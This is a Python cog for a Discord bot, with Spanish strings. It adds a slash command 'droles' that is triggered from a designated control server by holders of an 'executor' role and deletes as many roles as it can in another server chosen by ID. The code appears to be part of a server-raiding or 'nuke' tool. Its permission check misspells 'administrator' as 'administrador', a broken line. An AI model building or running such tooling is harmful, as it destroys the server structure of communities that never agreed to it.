import datetime

import nextcord
from nextcord.ext import commands, application_checks
from nextcord import Interaction, SlashOption, Embed, Color

from config.config_handler import ConfigHandler
from middlewares.server_verification import ServerVerification
from components.buttons.role_buttons import RolesButtonsDelete
from utils.server_utils import ServerUtils

class Droles(commands.Cog):
    
    config_handler = ConfigHandler()
    verifications = ServerVerification()
    utils = ServerUtils()
    
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        
    @nextcord.slash_command(
        name = "droles",
        description = "Elimina todos los roles que pueda.",
        guild_ids = config_handler.get_CaC_server_id()
    )
    
    @application_checks.has_role(config_handler.get_executor_rol_id())
    async def croles_command(self, ctx: Interaction, 
                    id: str = SlashOption(required = True, description = "Id del servidor objtivo.")):
        
        guild = self.utils.get_server(int(id), self.bot)
        
        self.verifications.check_command_execution_in_allowed_server(guild.id)
        self.verifications.check_bag(guild)
        
        if (not guild.me.guild_permissions.manage_roles
            and not guild.me.guild_permissions.administrador):
            
            raise commands.BotMissingPermissions(["268435456"])
        
        start_embed = Embed(
            title = "✅ |Da clic en el botón con '🚀' para iniciar la acción.",
            timestamp = datetime.datetime.now(),
            color = Color.blurple())
        
        view = RolesButtonsDelete(guild)
        await ctx.response.send_message(embed = start_embed, view = view)
        
def setup(client):
    client.add_cog(Droles(client))